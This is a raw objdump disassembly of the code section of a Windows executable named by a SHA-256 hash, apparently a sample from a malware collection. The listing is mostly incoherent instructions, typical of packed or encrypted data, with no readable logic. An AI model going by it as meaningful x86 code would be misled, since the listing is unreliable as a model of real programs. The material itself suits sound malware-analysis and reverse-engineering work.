
3f1603e7b9e730361502bbee849b94de0ee8e63aaed32e2c1c0e0cc5fa6e94d9.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	fyl2xp1 
  411002:	cmc    
  411003:	adc    dh,ch
  411005:	pop    edx
  411006:	jno    0x410fdb
  411008:	setae  BYTE PTR [eax-0x7ea6ee44]
  41100f:	stos   DWORD PTR es:[edi],eax
  411010:	das    
  411011:	push   ebx
  411012:	sbb    eax,0xc13d89d8
  411017:	fld    DWORD PTR ds:0xe5c12e22
  41101d:	out    0x86,al
  41101f:	scas   eax,DWORD PTR es:[edi]
  411020:	(bad)
  411024:	imul   esi,DWORD PTR ds:0xb50367a9,0x6b
  41102b:	aaa    
  41102c:	leave  
  41102d:	pop    ecx
  41102e:	hlt    
  41102f:	sub    esi,DWORD PTR [esi+eiz*2]
  411032:	inc    edx
  411033:	in     eax,0xd4
  411035:	clc    
  411036:	fnsave [ebp+0x78e8bbde]
  41103c:	jbe    0x411003
  41103e:	leave  
  41103f:	outs   dx,DWORD PTR ds:[esi]
  411040:	fsubr  st(7),st
  411042:	xchg   esp,eax
  411043:	shl    DWORD PTR [edx+0x2f],0x27
  411047:	shr    BYTE PTR [edx],0xce
  41104a:	dec    ebp
  41104b:	adc    ebx,DWORD PTR [ebx+0x28080084]
  411051:	mov    esp,0x31a3c226
  411056:	pop    ebx
  411057:	xchg   DWORD PTR [edx-0x80],eax
  41105a:	jmp    0x411086
  41105c:	sti    
  41105d:	and    ah,BYTE PTR [esi]
  41105f:	push   ss
  411060:	lock retf 0x3958
  411064:	mov    ds:0xa30601cc,eax
  411069:	repnz scas eax,DWORD PTR es:[edi]
  41106b:	das    
  41106c:	inc    eax
  41106d:	lods   eax,DWORD PTR ds:[esi]
  41106e:	xor    eax,0x2901aee1
  411073:	add    ah,cl
  411075:	cmp    ah,BYTE PTR [edi-0x7d629484]
  41107b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41107c:	call   0xf515:0xa0134de6
  411083:	push   esi
  411084:	adc    BYTE PTR ds:0x8782842e,al
  41108a:	inc    esi
  41108b:	in     eax,dx
  41108c:	sbb    ecx,DWORD PTR [edi+0x40]
  41108f:	in     al,dx
  411090:	(bad)  
  411091:	shl    DWORD PTR [ecx+eax*2-0x23],1
  411095:	popa   
  411096:	cdq    
  411097:	into   
  411098:	adc    DWORD PTR [edi+0x4f],edx
  41109b:	mov    edi,0xb77c738f
  4110a0:	lea    ebx,[edx+0x6d]
  4110a3:	dec    eax
  4110a4:	fmul   DWORD PTR ds:0xa5725e22
  4110aa:	ds retf 
  4110ac:	ss aaa 
  4110ae:	sbb    DWORD PTR [ecx],eax
  4110b0:	adc    eax,0x15ae57a3
  4110b5:	and    al,BYTE PTR ds:0x346b51d9
  4110bb:	xchg   ebp,eax
  4110bc:	or     BYTE PTR [ebp-0x41],bh
  4110bf:	icebp  
  4110c0:	cmp    ebp,edx
  4110c2:	fisttp WORD PTR [ebx+0x30]
  4110c5:	sbb    ecx,eax
  4110c7:	push   0x30
  4110c9:	bound  esp,QWORD PTR [esi]
  4110cb:	sti    
  4110cc:	aaa    
  4110cd:	mov    ch,0x48
  4110cf:	mov    ah,0xe0
  4110d1:	ret    
  4110d2:	fst    DWORD PTR [edx]
  4110d4:	test   eax,0x9f92e7ea
  4110d9:	inc    BYTE PTR [ebp+0x43b681bc]
  4110df:	gs sbb al,0x69
  4110e2:	mov    ds:0x1ff20448,eax
  4110e7:	and    DWORD PTR [edx],esi
  4110e9:	out    0x9,al
  4110eb:	(bad)  {k3}{z}
  4110f0:	or     eax,0x342803da
  4110f5:	js     0x4110de
  4110f7:	sub    DWORD PTR [esi],ebp
  4110f9:	pop    edx
  4110fa:	or     bl,BYTE PTR [ebp-0x395be90f]
  411100:	stos   BYTE PTR es:[edi],al
  411101:	rcr    ah,cl
  411103:	jmp    edi
  411105:	mov    WORD PTR [ebx-0x5],es
  411108:	xchg   DWORD PTR [esi*2+0x5a07d31d],ebx
  41110f:	mov    ecx,0x9361dd48
  411114:	pop    eax
  411115:	fs cmp al,0xfe
  411118:	(bad)  
  411119:	xchg   esi,eax
  41111a:	push   0x8887c62f
  41111f:	(bad)  
  411120:	arpl   WORD PTR [esi+0x4f4bf86],bp
  411126:	push   ebx
  411127:	shr    DWORD PTR [ecx-0x751666b4],cl
  41112d:	jle    0x4110d4
  41112f:	adc    eax,0xcc3c91ff
  411134:	mov    ah,0x68
  411136:	data16 das 
  411138:	pop    eax
  411139:	js     0x41114c
  41113b:	jle    0x41117c
  41113d:	push   di
  41113f:	add    eax,0xd44b02d6
  411144:	cmp    al,0xe2
  411146:	in     eax,0xcd
  411148:	es das 
  41114a:	pop    eax
  41114b:	cmp    BYTE PTR [edi-0x503941e],ah
  411151:	jecxz  0x41115a
  411153:	inc    ebx
  411154:	pop    edx
  411155:	test   DWORD PTR [edi+0x7e],esi
  411158:	in     eax,dx
  411159:	dec    ebx
  41115a:	cmp    dl,BYTE PTR [ebp-0x4322b5bf]
  411160:	mov    gs,WORD PTR ds:0x3a6ab3c8
  411166:	dec    edi
  411167:	clc    
  411168:	adc    bh,BYTE PTR [eax+0x17]
  41116b:	es sub al,0x87
  41116e:	pusha  
  41116f:	mov    ?,WORD PTR [eax-0x43]
  411172:	jg     0x411164
  411174:	ins    BYTE PTR es:[edi],dx
  411175:	pushf  
  411176:	div    BYTE PTR [ebx+ebx*1+0x39f32e85]
  41117d:	stc    
  41117e:	ja     0x411170
  411180:	inc    ecx
  411181:	sti    
  411182:	aad    0xc2
  411184:	jbe    0x41111a
  411186:	fisttp DWORD PTR [edx-0x43c3c97f]
  41118c:	ja     0x4111f2
  41118e:	mov    al,0x7d
  411190:	gs cli 
  411192:	nop
  411193:	sti    
  411194:	sahf   
  411195:	sub    DWORD PTR [edi-0x4381c5da],ecx
  41119b:	dec    esi
  41119c:	and    DWORD PTR [esi+0x39b7e008],esp
  4111a2:	rol    BYTE PTR [ebx-0x5a],0x97
  4111a6:	jl     0x4111de
  4111a8:	mov    al,0x53
  4111aa:	inc    esp
  4111ab:	mov    bl,0xc7
  4111ad:	(bad)  
  4111ae:	imul   ebx,edi,0x1b6e9783
  4111b4:	jle    0x4111c7
  4111b6:	cli    
  4111b7:	cmp    al,0x5f
  4111b9:	jbe    0x4111f6
  4111bb:	adc    eax,0x84d6fcf7
  4111c0:	jg     0x4111db
  4111c2:	sub    al,0x6f
  4111c4:	fistp  WORD PTR ds:0xb8018552
  4111ca:	fwait
  4111cb:	stos   DWORD PTR es:[edi],eax
  4111cc:	mov    ecx,0xef3889f8
  4111d1:	dec    eax
  4111d2:	mov    WORD PTR ds:0xb8f6c5de,ds
  4111d8:	div    BYTE PTR [eax+0x1832e9c]
  4111de:	je     0x411185
  4111e0:	(bad)  
  4111e1:	sub    edi,ecx
  4111e3:	jge    0x4111d9
  4111e5:	sbb    dh,dh
  4111e7:	aad    0x66
  4111e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111ea:	loopne 0x4111a6
  4111ec:	(bad)  
  4111ed:	not    BYTE PTR [ecx]
  4111ef:	adc    edi,DWORD PTR [edx]
  4111f1:	pop    ss
  4111f2:	sub    eax,0xfc1faf3e
  4111f7:	dec    ecx
  4111f8:	jae    0x411222
  4111fa:	outs   dx,DWORD PTR ds:[esi]
  4111fb:	outs   dx,BYTE PTR ds:[esi]
  4111fc:	cmc    
  4111fd:	sub    cl,BYTE PTR ds:0x1414da26
  411203:	sub    BYTE PTR [eax+0x1d785c4],ch
  411209:	xchg   esi,eax
  41120a:	dec    DWORD PTR [eax-0x32]
  41120d:	dec    esp
  41120e:	dec    ebp
  41120f:	mov    fs,WORD PTR [ebx+0x22ebaf72]
  411215:	int    0x2a
  411217:	pop    eax
  411218:	jmp    0x799e6f80
  41121d:	retf   
  41121e:	lods   al,BYTE PTR ds:[esi]
  41121f:	and    al,0xa4
  411221:	add    edx,ecx
  411223:	push   esi
  411224:	add    BYTE PTR [eax],dl
  411226:	mov    esi,0x8c75ed1b
  41122b:	rdmsr  
  41122d:	or     dh,BYTE PTR [bx+di+0x17]
  411231:	pushf  
  411232:	jbe    0x411229
  411234:	push   cs
  411235:	cmc    
  411236:	xor    dh,BYTE PTR [edx-0x6e2fb745]
  41123c:	mov    dl,0x4c
  41123e:	cwde   
  41123f:	ins    BYTE PTR es:[edi],dx
  411240:	xchg   DWORD PTR ds:0xdecbebb7,esi
  411246:	cmp    eax,0x5106cdb2
  41124b:	cmp    ebx,ecx
  41124d:	std    
  41124e:	xchg   edx,eax
  41124f:	test   DWORD PTR [eax+0x40],edi
  411252:	mov    DWORD PTR [eax+edx*2-0x2e9ef1d7],ecx
  411259:	js     0x4111fa
  41125b:	and    eax,0x2d4ad112
  411260:	and    dh,BYTE PTR ds:[ebx-0x1600216a]
  411267:	mov    dh,0xcf
  411269:	fwait
  41126a:	daa    
  41126b:	paddsb mm6,mm3
  41126e:	sub    DWORD PTR [ecx-0x5c],edx
  411271:	push   ebx
  411272:	xor    eax,DWORD PTR [ebp-0x4d]
  411275:	cmp    ebx,edx
  411277:	dec    ecx
  411278:	imul   ebp,esp,0x0
  41127b:	xor    BYTE PTR [eax-0x30310b9e],0xcb
  411282:	jbe    0x4112ff
  411284:	(bad)  
  411285:	mov    al,ds:0x1a1f7bc4
  41128a:	mov    dl,0xd9
  41128c:	ss push esp
  41128e:	not    ebp
  411290:	fnstenv [ebx-0x2d]
  411293:	adc    BYTE PTR [edi],ah
  411295:	mov    ebp,0xa343e38d
  41129a:	sbb    eax,0x8d6cd398
  41129f:	je     0x411304
  4112a1:	inc    esp
  4112a2:	ins    DWORD PTR es:[edi],dx
  4112a3:	adc    BYTE PTR [ebx],bl
  4112a5:	scas   eax,DWORD PTR es:[edi]
  4112a6:	dec    ebx
  4112a7:	or     DWORD PTR ss:[eax+ebx*8+0x305bd192],ebp
  4112af:	repnz push eax
  4112b1:	sti    
  4112b2:	xchg   ebx,eax
  4112b3:	nop
  4112b4:	into   
  4112b5:	dec    esi
  4112b6:	jne    0x4112dd
  4112b8:	in     al,0xde
  4112ba:	mov    bl,0xbf
  4112bc:	dec    ebx
  4112bd:	mov    ebx,0x53df54d8
  4112c2:	outs   dx,DWORD PTR ds:[esi]
  4112c3:	test   eax,0xfb12e2a7
  4112c8:	sbb    ebp,edx
  4112ca:	clc    
  4112cb:	out    dx,eax
  4112cc:	mov    ebp,DWORD PTR [edi+ebx*4-0x64]
  4112d0:	and    DWORD PTR [edx+0x21],ebx
  4112d3:	repz (bad) 
  4112d5:	dec    ebx
  4112d6:	sub    eax,ebp
  4112d8:	or     bh,BYTE PTR [ebx+0x25a7c3e1]
  4112de:	push   esi
  4112df:	cmp    esi,DWORD PTR gs:[eax+ebx*8]
  4112e3:	arpl   WORD PTR [esi-0x23],di
  4112e6:	jmp    0x4112dc
  4112e8:	std    
  4112e9:	fisub  WORD PTR [ebx+0x3e7981ac]
  4112ef:	cmp    DWORD PTR [edx-0x4faf307e],ecx
  4112f5:	add    BYTE PTR [eax-0x3b5dff4b],0x3e
  4112fc:	or     al,0x88
  4112ff:	mov    bh,0x32
  411301:	das    
  411302:	in     eax,dx
  411303:	(bad)  
  411304:	adc    BYTE PTR [ebp+0x6],dh
  411307:	dec    edx
  411308:	mov    ds:0xc211624e,al
  41130d:	loopne 0x41130a
  41130f:	bound  eax,QWORD PTR [edx+0x4513b1f0]
  411315:	aad    0x19
  411317:	sub    BYTE PTR ds:0x56568a96,ch
  41131d:	sti    
  41131e:	jb     0x411338
  411320:	mov    dl,0xd0
  411322:	mov    edi,0xdb22a4a4
  411327:	dec    ecx
  411328:	cdq    
  411329:	(bad)
  41132c:	outs   dx,DWORD PTR ds:[esi]
  41132d:	dec    ecx
  41132e:	daa    
  41132f:	mov    ebx,esp
  411331:	sbb    ah,0x7a
  411334:	jle    0x411374
  411336:	stos   BYTE PTR es:[edi],al
  411337:	or     eax,0x1f3d50f5
  41133c:	push   ebp
  41133d:	pushw  0x41fa
  411341:	loop   0x411376
  411343:	data16 pushaw 
  411346:	aad    0x44
  411348:	xchg   ecx,eax
  411349:	test   al,0xbe
  41134b:	push   esi
  41134c:	adc    DWORD PTR [edi],esi
  41134e:	and    DWORD PTR [edx-0x50],ebp
  411351:	jno    0x411323
  411353:	mov    cl,0x46
  411355:	gs and al,al
  411358:	add    ecx,DWORD PTR fs:[edi]
  41135b:	mov    ebx,0xbc87d170
  411360:	add    eax,0x6c05c0d3
  411365:	fwait
  411366:	inc    esi
  411367:	xor    dh,BYTE PTR [ebx+0x6f1b2b3b]
  41136d:	mov    ebx,0x503e8cbe
  411372:	and    esp,DWORD PTR [ebx-0x16]
  411375:	push   ecx
  411377:	je     0x41136a
  411379:	pushf  
  41137a:	xor    DWORD PTR [esi-0x5a813a9a],ebx
  411380:	mov    ebx,0x996b3eea
  411385:	std    
  411386:	jno    0x4113ae
  411388:	cs into 
  41138a:	jb     0x4113d3
  41138c:	adc    DWORD PTR [ebx+edx*2+0xf4addab],eax
  411393:	jg     0x411336
  411395:	push   es
  411396:	xor    al,0xb4
  411398:	mov    WORD PTR ds:0xd12c8cbf,cs
  41139e:	adc    al,dl
  4113a0:	xchg   esp,eax
  4113a1:	sbb    bl,BYTE PTR [ecx]
  4113a3:	xchg   esp,eax
  4113a4:	jp     0x4113de
  4113a6:	adc    DWORD PTR [ecx-0x61],ecx
  4113a9:	sub    dl,BYTE PTR es:[ebx-0x2e075538]
  4113b0:	dec    ebx
  4113b1:	mov    WORD PTR [ebx+0x25],ss
  4113b4:	cdq    
  4113b5:	push   ebx
  4113b6:	xor    esp,DWORD PTR [edx+0x32]
  4113b9:	pop    eax
  4113ba:	rol    DWORD PTR [eax+0x546ce28a],0x9c
  4113c1:	pop    es
  4113c2:	push   edx
  4113c3:	mov    eax,0x36c07f94
  4113c9:	add    edi,DWORD PTR [edi]
  4113cb:	rcl    BYTE PTR [edi-0x2a],cl
  4113ce:	out    0x7d,eax
  4113d0:	xlat   BYTE PTR ds:[ebx]
  4113d1:	(bad)  
  4113d2:	push   ss
  4113d3:	jmp    0xb700:0x951031a4
  4113da:	pop    ebx
  4113db:	sbb    BYTE PTR [ecx-0x14bf3841],bh
  4113e1:	jp     0x4113da
  4113e3:	mov    ds:0x684ca639,al
  4113e8:	clc    
  4113e9:	xchg   ecx,eax
  4113ea:	shl    DWORD PTR [esi+ebx*2],cl
  4113ed:	dec    esp
  4113ee:	inc    ebx
  4113ef:	mov    al,ds:0x928023b9
  4113f4:	inc    ebp
  4113f5:	and    eax,0xd5461640
  4113fa:	dec    esi
  4113fb:	pop    ecx
  4113fc:	dec    esi
  4113fd:	ficomp WORD PTR [ecx]
  4113ff:	test   eax,0x49e7030e
  411404:	or     DWORD PTR [ecx+0x15],ebx
  411407:	dec    esp
  411408:	adc    ebx,edx
  41140a:	cmp    eax,esp
  41140c:	jge    0x411460
  41140e:	cli    
  41140f:	push   0xfffffff4
  411411:	cld    
  411412:	sbb    cl,dl
  411414:	rcl    DWORD PTR [ecx+0x7c3c451d],1
  41141a:	arpl   bx,cx
  41141c:	push   eax
  41141d:	mov    cl,0xd1
  41141f:	bound  edi,QWORD PTR [edx-0x65]
  411422:	xor    DWORD PTR [ecx+0x2421280],edx
  411428:	(bad)  
  411429:	mov    esi,0xe54a19c9
  41142e:	pop    edx
  41142f:	jge    0x4113bc
  411431:	es or  al,0xd0
  411434:	jle    0x411438
  411436:	jmp    0x411428
  411438:	sub    BYTE PTR [ecx+0x10],al
  41143b:	add    bh,BYTE PTR [eax+esi*4]
  41143e:	adc    cl,ch
  411440:	in     al,0xc6
  411442:	ret    
  411443:	stos   DWORD PTR es:[edi],eax
  411444:	xchg   ebx,eax
  411445:	rcr    DWORD PTR [edi],cl
  411447:	fcom   QWORD PTR [edx]
  411449:	and    al,0xe9
  41144b:	adc    al,ah
  41144d:	xchg   ebx,eax
  41144e:	icebp  
  41144f:	(bad)  
  411450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411451:	push   esp
  411452:	or     eax,0x85e00931
  411457:	xor    ebp,ebp
  411459:	cmc    
  41145a:	xchg   ecx,eax
  41145b:	test   eax,0xd1786922
  411460:	aad    0xa4
  411462:	pop    edi
  411463:	xor    eax,0x7928f58f
  411468:	loope  0x4113ec
  41146a:	adc    BYTE PTR [ebx+0x7f],0x44
  41146e:	into   
  41146f:	jmp    0x41142f
  411471:	dec    esi
  411472:	mov    cl,0x6a
  411474:	sub    esp,DWORD PTR [edi-0x5c]
  411477:	aad    0x1c
  411479:	sub    DWORD PTR [ecx-0x73],0x39ac1cbb
  411480:	jmp    0x15ed49e6
  411485:	pop    ebx
  411486:	and    edi,DWORD PTR [esi-0x2c]
  411489:	sub    DWORD PTR [ecx+0x53],ebx
  41148c:	or     ecx,eax
  41148e:	test   al,0xd7
  411490:	retf   0x89df
  411493:	dec    edx
  411494:	out    dx,al
  411495:	mov    cl,BYTE PTR [edi+0x62]
  411498:	adc    eax,0xf6bc311b
  41149d:	lods   eax,DWORD PTR ds:[esi]
  41149e:	pop    esi
  41149f:	mov    ds:0x2a93e1d,eax
  4114a4:	clc    
  4114a5:	loope  0x411490
  4114a7:	test   BYTE PTR [eax],0xd7
  4114aa:	dec    esp
  4114ab:	inc    edi
  4114ac:	or     edx,DWORD PTR [eax]
  4114ae:	ror    DWORD PTR [eax+ebp*2],1
  4114b1:	push   ss
  4114b2:	imul   edx,edx,0x489591eb
  4114b8:	sub    DWORD PTR [edx+0x1],edx
  4114bb:	(bad)  
  4114bc:	jns    0x411500
  4114be:	outs   dx,DWORD PTR ds:[esi]
  4114bf:	ret    
  4114c0:	mov    bl,BYTE PTR ds:0x6dbe19e6
  4114c6:	aam    0x4
  4114c8:	fmul   QWORD PTR [eax+eax*2-0x71e6e244]
  4114cf:	add    al,0x66
  4114d1:	test   eax,0xf0048dd3
  4114d6:	aaa    
  4114d7:	jns    0x4114c8
  4114d9:	pop    esi
  4114da:	nop
  4114db:	inc    esp
  4114dc:	dec    ecx
  4114dd:	inc    ebp
  4114de:	rol    dh,cl
  4114e0:	rol    cl,1
  4114e2:	adc    DWORD PTR [ebx],edx
  4114e4:	push   ebp
  4114e5:	jae    0x411528
  4114e7:	jbe    0x41153a
  4114e9:	enter  0x6aa3,0x8
  4114ed:	sub    DWORD PTR [ecx+0x7495ad3f],ecx
  4114f3:	adc    esp,0xe9fd888d
  4114f9:	popf   
  4114fa:	mov    edi,0x7ad44e10
  4114ff:	inc    eax
  411500:	inc    eax
  411501:	sti    
  411502:	in     eax,dx
  411503:	dec    edi
  411504:	pushf  
  411505:	adc    DWORD PTR [edi],ebp
  411507:	shr    BYTE PTR [ebx],cl
  411509:	rcr    DWORD PTR [eax+0x22],0x24
  41150d:	push   esp
  41150e:	dec    ebx
  41150f:	and    DWORD PTR [ebx],ebp
  411511:	mov    edx,0xecf85bc9
  411516:	push   edx
  411517:	mov    eax,ds:0xc1e72dc7
  41151c:	fwait
  41151d:	or     bl,0x51
  411520:	jg     0x41159f
  411522:	sub    DWORD PTR [ebp+eiz*1+0x76c123bf],eax
  411529:	pop    eax
  41152a:	dec    edx
  41152b:	xor    al,0xf4
  41152d:	shl    BYTE PTR [ebx+0x3e],cl
  411530:	cs in  al,dx
  411532:	mov    DWORD PTR [edi+0x2105fee8],ecx
  411538:	stos   DWORD PTR es:[edi],eax
  411539:	out    0x8f,eax
  41153b:	outs   dx,DWORD PTR ds:[esi]
  41153c:	aaa    
  41153d:	loopne 0x4115a0
  41153f:	cdq    
  411540:	aam    0x67
  411542:	and    eax,0xcb32ef75
  411547:	mov    ecx,0xdf225399
  41154c:	int3   
  41154d:	inc    eax
  41154e:	js     0x4115ab
  411550:	sbb    dl,BYTE PTR [ecx]
  411552:	or     eax,0x15bcc12e
  411557:	xor    eax,0x8deb665
  41155c:	sub    DWORD PTR [esi+0x71e0e64e],ecx
  411562:	jae    0x41150a
  411564:	dec    esi
  411565:	push   ecx
  411566:	push   ds
  411567:	or     eax,0x737fbe40
  41156c:	imul   edi,DWORD PTR [edi+esi*2+0x49e3056b],0xffffffb5
  411574:	leave  
  411575:	mov    BYTE PTR [ebx-0x5564b052],ah
  41157b:	imul   DWORD PTR [eax]
  41157d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41157e:	jb     0x41154f
  411580:	sar    DWORD PTR [ecx+0x87c21b1],0x8b
  411587:	not    ah
  411589:	pop    edx
  41158a:	pop    edx
  41158b:	mov    al,ds:0x4e14a850
  411590:	test   eax,0x6f5c8a50
  411595:	call   0xe4cfd264
  41159a:	test   eax,0x7e63db84
  41159f:	xchg   esi,eax
  4115a0:	lock popf 
  4115a2:	test   eax,0xb73406a3
  4115a7:	mov    bh,0x47
  4115a9:	clc    
  4115aa:	or     BYTE PTR [eax],0xff
  4115ad:	pop    edi
  4115ae:	mov    esi,0xea167499
  4115b3:	xor    al,0xdb
  4115b5:	enter  0xf31a,0x45
  4115b9:	enter  0x2205,0x8d
  4115bd:	cmp    BYTE PTR [ebx+0x679992ce],bh
  4115c3:	int3   
  4115c4:	test   BYTE PTR [eax-0x1],al
  4115c7:	mov    esi,0x1acc8492
  4115cc:	loop   0x411648
  4115ce:	dec    ebx
  4115cf:	in     al,dx
  4115d0:	aaa    
  4115d1:	cld    
  4115d2:	mov    eax,0x695481f0
  4115d7:	inc    ecx
  4115d8:	daa    
  4115d9:	jo     0x4115eb
  4115db:	hlt    
  4115dc:	repz mov al,0xf9
  4115df:	into   
  4115e0:	clc    
  4115e1:	jo     0x41157b
  4115e3:	mov    al,ds:0xf4f00c59
  4115e8:	cmp    ah,cl
  4115ea:	xchg   edi,eax
  4115eb:	xor    dh,BYTE PTR [ecx+edi*8]
  4115ee:	test   dh,ah
  4115f0:	jp     0x4115d8
  4115f2:	push   ds
  4115f3:	or     edi,DWORD PTR [ebx-0x43]
  4115f6:	mov    ebp,0x3e529872
  4115fb:	imul   edx,DWORD PTR es:[edx+ecx*4-0x54c818a5],0xffffff9c
  411604:	adc    edi,DWORD PTR [edi]
  411606:	pop    ss
  411607:	push   ss
  411608:	and    dl,ah
  41160a:	pop    ebx
  41160b:	les    esp,FWORD PTR [ebx]
  41160d:	in     eax,0xd2
  41160f:	add    BYTE PTR [ecx-0x30],bl
  411612:	jns    0x4115f1
  411614:	test   eax,0xd63b8ad3
  411619:	sub    DWORD PTR [ecx],0xe9e23cd7
  41161f:	add    dh,BYTE PTR ds:0xc1e6d5ef
  411625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411626:	push   edx
  411627:	mov    edi,0x14e857c3
  41162c:	lods   eax,DWORD PTR ds:[esi]
  41162d:	jns    0x41166c
  41162f:	jns    0x411689
  411631:	stos   BYTE PTR es:[edi],al
  411632:	in     eax,dx
  411633:	adc    eax,0x2dbfb042
  411638:	or     DWORD PTR [ecx+0x1777aefc],ecx
  41163e:	retf   
  41163f:	pushf  
  411640:	xor    esp,esi
  411642:	jg     0x411603
  411644:	ins    DWORD PTR es:[edi],dx
  411645:	popf   
  411646:	cli    
  411647:	cld    
  411648:	psubsw mm2,mm0
  41164b:	aaa    
  41164c:	shr    BYTE PTR [edi],1
  41164e:	mov    edx,edi
  411650:	aad    0x6d
  411652:	add    edi,edx
  411654:	out    dx,eax
  411655:	in     al,dx
  411656:	mov    DWORD PTR ds:0x2311d3c5,eax
  41165c:	push   ecx
  41165d:	sbb    edi,DWORD PTR ds:0x547d05bf
  411663:	or     al,0x8
  411665:	jo     0x41162c
  411667:	std    
  411668:	add    ecx,edi
  41166a:	(bad)  
  41166b:	cmp    BYTE PTR [edx],bh
  41166d:	xor    al,0x7d
  41166f:	xchg   edi,eax
  411670:	std    
  411671:	iret   
  411672:	fisttp WORD PTR [edi]
  411674:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411676:	mov    WORD PTR [edi-0x215392dd],?
  41167c:	mov    esp,0x7e0662cc
  411681:	fs in  al,dx
  411683:	dec    ecx
  411684:	sbb    al,0x5a
  411686:	cmp    edx,edi
  411688:	js     0x4116e6
  41168a:	sub    BYTE PTR [eax],bh
  41168c:	iret   
  41168d:	and    ch,bh
  41168f:	jle    0x4116b0
  411691:	test   al,0x8d
  411693:	(bad)  
  411694:	mov    esp,0x20b22cc
  411699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41169a:	add    ax,bp
  41169d:	scas   eax,DWORD PTR es:[edi]
  41169e:	(bad)  
  41169f:	fcomp  QWORD PTR [edi-0x53]
  4116a2:	(bad)  
  4116a4:	jmp    0xd86a:0x797d0201
  4116ab:	stos   BYTE PTR es:[edi],al
  4116ac:	xor    DWORD PTR [edx-0xd3da698],edi
  4116b2:	jae    0x4116df
  4116b4:	loopne 0x411702
  4116b6:	lods   al,BYTE PTR ds:[esi]
  4116b7:	test   eax,0x9bc21d84
  4116bc:	xor    eax,0xab7366d4
  4116c1:	xor    al,0x17
  4116c3:	dec    esi
  4116c4:	in     al,dx
  4116c5:	inc    ebp
  4116c6:	in     eax,dx
  4116c7:	push   cs
  4116c8:	jle    0x411652
  4116ca:	fisubr DWORD PTR [edx+0x6482b938]
  4116d0:	aad    0x2d
  4116d2:	mov    ah,BYTE PTR [edx-0x49e36d3]
  4116d8:	mov    ecx,0x55f0184d
  4116dd:	mov    al,0x7c
  4116df:	push   ss
  4116e0:	fcmovnu st,st(5)
  4116e2:	jmp    DWORD PTR [eax+0x8520d1a]
  4116e8:	and    BYTE PTR [ebx],dl
  4116ea:	mov    al,ds:0x1c83f599
  4116ef:	sub    eax,0x242d0b64
  4116f4:	jp     0x411762
  4116f6:	xor    DWORD PTR [eax-0x27319718],ebp
  4116fc:	ja     0x4116f5
  4116fe:	adc    al,0x8f
  411700:	xor    DWORD PTR [eax+ebp*8],ecx
  411703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411704:	adc    al,0x69
  411706:	(bad)  
  411707:	pushf  
  411708:	out    dx,eax
  411709:	cli    
  41170a:	push   ecx
  41170b:	jae    0x411730
  41170d:	dec    edi
  41170e:	ins    DWORD PTR es:[edi],dx
  41170f:	push   ebx
  411710:	sahf   
  411711:	pusha  
  411712:	in     al,dx
  411713:	cdq    
  411714:	add    eax,0xd8a336c
  411719:	push   ss
  41171a:	test   eax,edi
  41171c:	mov    eax,ds:0xbd035074
  411721:	jle    0x4116d7
  411723:	psubq  mm4,QWORD PTR [edi+ebx*2+0x379c95fe]
  41172b:	out    dx,eax
  41172c:	cmc    
  41172d:	rcr    BYTE PTR [ebx-0xccdd5e],1
  411733:	shr    DWORD PTR [ecx-0x54],1
  411736:	stos   DWORD PTR es:[edi],eax
  411737:	and    BYTE PTR [ebx+0x56f377a7],bh
  41173d:	mov    edx,0x741ab0ae
  411742:	mov    al,0xf8
  411744:	xchg   edx,eax
  411745:	jp     0x411726
  411747:	and    DWORD PTR [ecx],ebx
  411749:	mov    bh,0xe3
  41174b:	ret    0xb853
  41174e:	fld    QWORD PTR [eax+0x2f]
  411751:	sub    eax,0xa548fdc6
  411756:	push   0xf8dde760
  41175b:	mov    eax,ds:0xf26bc107
  411760:	mov    BYTE PTR [edi-0x65],0xe5
  411764:	test   DWORD PTR [edx],edx
  411766:	or     eax,0x4392502f
  41176b:	(bad)  
  41176c:	fild   DWORD PTR [edx-0x2]
  41176f:	int3   
  411770:	mov    edx,0x13fb4a5
  411775:	and    dh,dh
  411777:	cmp    DWORD PTR [ebp+0x30],ebx
  41177a:	xchg   esi,eax
  41177b:	jge    0x4117f1
  41177d:	sub    DWORD PTR [esi-0x6],ebx
  411780:	int3   
  411781:	mov    esi,edi
  411783:	jbe    0x411715
  411785:	jnp    0x4117d3
  411787:	cmc    
  411788:	sbb    eax,DWORD PTR [edi+0x7242f784]
  41178e:	call   0x57397978
  411793:	out    dx,al
  411794:	bound  ebp,QWORD PTR [edi]
  411796:	(bad)  [edx-0x7b]
  411799:	jnp    0x411763
  41179b:	mov    ebp,0xa414ad4c
  4117a0:	mov    dl,0xbb
  4117a2:	aaa    
  4117a3:	xchg   ebp,eax
  4117a4:	xchg   edi,eax
  4117a5:	mov    ds:0x209d9173,al
  4117aa:	mov    WORD PTR [edi],es
  4117ac:	and    eax,0x94cc57d7
  4117b1:	push   edx
  4117b2:	lahf   
  4117b3:	xchg   esi,eax
  4117b4:	pushf  
  4117b5:	ret    0x87e
  4117b8:	pusha  
  4117b9:	dec    edi
  4117ba:	mov    ch,0xe9
  4117bc:	loopne 0x411775
  4117be:	popf   
  4117bf:	sbb    esp,DWORD PTR [edx+0x60e25a9d]
  4117c5:	push   esp
  4117c6:	mov    eax,0x3712d3e9
  4117cb:	je     0x41182c
  4117cd:	or     eax,0x65740d92
  4117d2:	data16 out dx,al
  4117d4:	shr    BYTE PTR [edx+ecx*2],cl
  4117d7:	aaa    
  4117d8:	jp     0x411809
  4117da:	scas   eax,DWORD PTR es:[edi]
  4117db:	adc    BYTE PTR [ebp+0x48],cl
  4117de:	mov    ch,0x27
  4117e0:	pop    esp
  4117e1:	ja     0x411770
  4117e3:	dec    eax
  4117e4:	into   
  4117e5:	ins    DWORD PTR es:[edi],dx
  4117e6:	adc    edi,edx
  4117e8:	xchg   ebx,eax
  4117e9:	ret    
  4117ea:	fbld   TBYTE PTR [ecx+0x3e]
  4117ed:	push   esi
  4117ee:	adc    eax,0x5e9d65bc
  4117f3:	clc    
  4117f4:	sbb    DWORD PTR [esi],ebx
  4117f6:	push   esp
  4117f7:	ja     0x4117ad
  4117f9:	dec    edi
  4117fa:	int    0xc8
  4117fc:	and    al,0x18
  4117fe:	sub    ebp,DWORD PTR [ecx+0x34527bd2]
  411804:	aaa    
